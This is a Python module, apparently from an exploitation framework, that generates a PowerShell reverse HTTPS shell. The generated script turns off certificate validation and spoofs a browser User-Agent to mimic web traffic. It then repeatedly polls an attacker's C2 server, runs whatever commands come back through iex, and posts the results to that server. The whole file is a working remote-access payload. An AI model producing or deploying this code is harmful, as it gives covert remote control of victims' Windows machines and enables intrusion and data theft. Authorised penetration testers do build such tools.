"""PowerShell Reverse HTTPS Shell — HTTPS polling C2."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "PowerShell Reverse HTTPS",
        "description": "PowerShell HTTPS polling shell — mimics web traffic.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "HTTPS C2 server", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "HTTPS port", "required": True, "default": "443", "value": "443"},
        "URI":   {"description": "C2 URI path", "required": False, "default": "/api/v1/data", "value": "/api/v1/data"},
        "SLEEP": {"description": "Poll interval (seconds)", "required": False, "default": "5", "value": "5"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        uri   = self.options["URI"]["value"]
        sleep = self.options["SLEEP"]["value"]

        ps = f"""[System.Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};
[System.Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$base="https://{lhost}:{lport}";
$h=@{{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}};
while($true){{
  try{{
    $cmd=(Invoke-WebRequest -Uri "$base{uri}" -Headers $h -UseBasicParsing).Content;
    if($cmd -ne ""){{
      $out=iex $cmd 2>&1|Out-String;
      Invoke-WebRequest -Uri "$base{uri}/result" -Method POST -Body $out -Headers $h -UseBasicParsing|Out-Null
    }}
  }}catch{{}}
  Start-Sleep {sleep}
}}"""
        return ps.encode()
